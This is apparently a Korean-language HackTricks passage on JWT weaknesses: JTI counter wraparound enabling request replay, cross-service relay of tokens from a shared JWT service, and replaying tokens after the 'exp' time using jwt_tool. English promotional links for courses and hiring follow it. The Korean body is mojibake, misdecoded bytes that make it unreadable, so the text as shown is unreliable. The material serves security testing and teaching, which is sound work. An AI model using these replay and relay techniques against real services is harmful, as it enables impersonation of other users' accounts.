JTI (JWT ID) í´ë ˆì„ì€ JWT í† í°ì— ëŒ€í•œ ê³ ìœ  ì‹ë³„ìë¥¼ ì œê³µí•©ë‹ˆë‹¤. ì´ëŠ” í† í°ì´ ì¬ì „ì†¡ë˜ëŠ” ê²ƒì„ ë°©ì§€í•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ê·¸ëŸ¬ë‚˜ IDì˜ ìµœëŒ€ ê¸¸ì´ê°€ 4(0001-9999)ì¸ ìƒí™©ì„ ìƒìƒí•´ ë³´ì‹­ì‹œì˜¤. ìš”ì²­ 0001ê³¼ 10001ì€ ê°™ì€ IDë¥¼ ì‚¬ìš©í•  ê²ƒì…ë‹ˆë‹¤. ë”°ë¼ì„œ ë°±ì—”ë“œê°€ ê° ìš”ì²­ë§ˆë‹¤ IDë¥¼ ì¦ê°€ì‹œí‚¤ê³  ìˆë‹¤ë©´, ì´ë¥¼ ì•…ìš©í•˜ì—¬ **ìš”ì²­ì„ ì¬ì „ì†¡**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ê° ì„±ê³µì ì¸ ì¬ì „ì†¡ ì‚¬ì´ì— 10000 ìš”ì²­ì„ ë³´ë‚´ì•¼ í•¨).

### JWT ë“±ë¡ í´ë ˆì„

{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml#claims" %}

### ê¸°íƒ€ ê³µê²©

**êµì°¨ ì„œë¹„ìŠ¤ ë¦´ë ˆì´ ê³µê²©**

ì¼ë¶€ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ í† í°ì˜ ìƒì„± ë° ê´€ë¦¬ë¥¼ ìœ„í•´ ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” JWT ì„œë¹„ìŠ¤ì— ì˜ì¡´í•˜ëŠ” ê²ƒìœ¼ë¡œ ê´€ì°°ë˜ì—ˆìŠµë‹ˆë‹¤. JWT ì„œë¹„ìŠ¤ì— ì˜í•´ í•œ í´ë¼ì´ì–¸íŠ¸ë¥¼ ìœ„í•´ ìƒì„±ëœ í† í°ì´ ê°™ì€ JWT ì„œë¹„ìŠ¤ì˜ ë‹¤ë¥¸ í´ë¼ì´ì–¸íŠ¸ì— ì˜í•´ ìˆ˜ìš©ëœ ì‚¬ë¡€ê°€ ê¸°ë¡ë˜ì—ˆìŠµë‹ˆë‹¤. ì œ3ì ì„œë¹„ìŠ¤ë¥¼ í†µí•´ JWTì˜ ë°œê¸‰ ë˜ëŠ” ê°±ì‹ ì´ ê´€ì°°ë˜ë©´, ë™ì¼í•œ ì‚¬ìš©ì ì´ë¦„/ì´ë©”ì¼ì„ ì‚¬ìš©í•˜ì—¬ í•´ë‹¹ ì„œë¹„ìŠ¤ì˜ ë‹¤ë¥¸ í´ë¼ì´ì–¸íŠ¸ì— ê³„ì •ì„ ë“±ë¡í•  ê°€ëŠ¥ì„±ì„ ì¡°ì‚¬í•´ì•¼ í•©ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ, ì–»ì€ í† í°ì„ ëŒ€ìƒìœ¼ë¡œ ìš”ì²­í•˜ì—¬ ìˆ˜ìš©ë˜ëŠ”ì§€ í™•ì¸í•˜ê¸° ìœ„í•´ ì¬ì „ì†¡ì„ ì‹œë„í•´ì•¼ í•©ë‹ˆë‹¤.

* ê·€í•˜ì˜ í† í°ì´ ìˆ˜ìš©ë˜ë©´ ì‹¬ê°í•œ ë¬¸ì œê°€ ë°œìƒí•  ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” ëª¨ë“  ì‚¬ìš©ìì˜ ê³„ì •ì„ ìŠ¤í‘¸í•‘í•  ìˆ˜ ìˆëŠ” ê°€ëŠ¥ì„±ì„ í—ˆìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì œ3ì ì• í”Œë¦¬ì¼€ì´ì…˜ì— ê°€ì…í•˜ëŠ” ê²½ìš° ë” ë„“ì€ í…ŒìŠ¤íŠ¸ì— ëŒ€í•œ í—ˆê°€ê°€ í•„ìš”í•  ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” ë²•ì  íšŒìƒ‰ ì˜ì—­ì— ë“¤ì–´ê°ˆ ìˆ˜ ìˆìŒì„ ìœ ì˜í•´ì•¼ í•©ë‹ˆë‹¤.

**í† í°ì˜ ë§Œë£Œ í™•ì¸**

í† í°ì˜ ë§Œë£ŒëŠ” "exp" í˜ì´ë¡œë“œ í´ë ˆì„ì„ ì‚¬ìš©í•˜ì—¬ í™•ì¸ë©ë‹ˆë‹¤. JWTê°€ ì¢…ì¢… ì„¸ì…˜ ì •ë³´ ì—†ì´ ì‚¬ìš©ë˜ê¸° ë•Œë¬¸ì— ì‹ ì¤‘í•œ ì²˜ë¦¬ê°€ í•„ìš”í•©ë‹ˆë‹¤. ë§ì€ ê²½ìš°, ë‹¤ë¥¸ ì‚¬ìš©ìì˜ JWTë¥¼ ìº¡ì²˜í•˜ê³  ì¬ì „ì†¡í•˜ë©´ í•´ë‹¹ ì‚¬ìš©ìë¥¼ ê°€ì¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. JWT RFCëŠ” í† í°ì˜ ë§Œë£Œ ì‹œê°„ì„ ì„¤ì •í•˜ê¸° ìœ„í•´ "exp" í´ë ˆì„ì„ í™œìš©í•˜ì—¬ JWT ì¬ì „ì†¡ ê³µê²©ì„ ì™„í™”í•  ê²ƒì„ ê¶Œì¥í•©ë‹ˆë‹¤. ë˜í•œ, ì´ ê°’ì„ ì²˜ë¦¬í•˜ê³  ë§Œë£Œëœ í† í°ì„ ê±°ë¶€í•˜ëŠ” ê´€ë ¨ ê²€ì‚¬ë¥¼ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ êµ¬í˜„í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤. í† í°ì— "exp" í´ë ˆì„ì´ í¬í•¨ë˜ì–´ ìˆê³  í…ŒìŠ¤íŠ¸ ì‹œê°„ ì œí•œì´ í—ˆìš©ëœë‹¤ë©´, í† í°ì„ ì €ì¥í•˜ê³  ë§Œë£Œ ì‹œê°„ì´ ì§€ë‚œ í›„ ì¬ì „ì†¡í•˜ëŠ” ê²ƒì´ ì¢‹ìŠµë‹ˆë‹¤. íƒ€ì„ìŠ¤íƒ¬í”„ íŒŒì‹± ë° ë§Œë£Œ í™•ì¸(UTCì˜ íƒ€ì„ìŠ¤íƒ¬í”„ í¬í•¨)ì„ í¬í•¨í•œ í† í°ì˜ ë‚´ìš©ì€ jwt_toolì˜ -R í”Œë˜ê·¸ë¥¼ ì‚¬ìš©í•˜ì—¬ ì½ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

* ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ì—¬ì „íˆ í† í°ì„ ê²€ì¦í•˜ëŠ” ê²½ìš°, ì´ëŠ” í† í°ì´ ê²°ì½” ë§Œë£Œë˜ì§€ ì•Šì„ ìˆ˜ ìˆìŒì„ ì˜ë¯¸í•˜ë¯€ë¡œ ë³´ì•ˆ ìœ„í—˜ì´ ì¡´ì¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ë„êµ¬

{% embed url="https://github.com/ticarpi/jwt_tool" %}

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_fluent polish written and spoken required_).

{% embed url="https://www.stmcyber.com/careers" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
